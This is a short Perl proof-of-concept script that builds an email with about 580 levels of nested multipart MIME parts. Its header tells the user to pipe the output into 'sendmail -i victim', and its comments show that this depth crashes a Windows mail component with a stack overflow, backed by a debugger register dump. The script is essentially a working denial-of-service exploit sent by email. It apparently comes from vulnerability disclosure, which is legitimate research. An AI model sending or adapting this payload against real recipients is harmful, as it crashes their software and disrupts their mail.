#!/usr/bin/perl --
print "From: me\n";
print "To: you\n";
print "Subject: nested multipart test\n";
print "Mime-Version: 1.0\n";
print "X-Use: Pipe the output of this script into:  sendmail -i victim\n";
&nest(0);
print "\n";
#
sub nest {
  my ($x) = @_;
  my $b = sprintf("bndry%04d",$x);
  print "Content-Type: multipart/mixed; boundary=\"$b\"\n\n";
  print "--$b\n";
  print "Content-Type: text/plain\n\n";
  print "Level $x\n\n";
# No problem for 570, but crash for 580 deep nesting:
#
# (444.458): Stack overflow - code c00000fd (first chance)
# First chance exceptions are reported before any exception handling.
# This exception may be expected and handled.
# eax=00000409 ebx=00000001 ecx=00000000 edx=00000001 esi=00033494 edi=62000000
# eip=77f862ed esp=00032afc ebp=0003339c iopl=0         nv up ei pl nz na po nc
# cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00010206
# ntdll!LdrLoadAlternateResourceModule+9:
# 77f862ed 53               push    ebx
  if ($x < 580) {
    print "--$b\n";
    &nest($x+1);
  }
  print "--$b\n";
  print "Content-Type: text/plain\n\n";
  print "Final $x\n";
  print "--$b--\n\n";
}
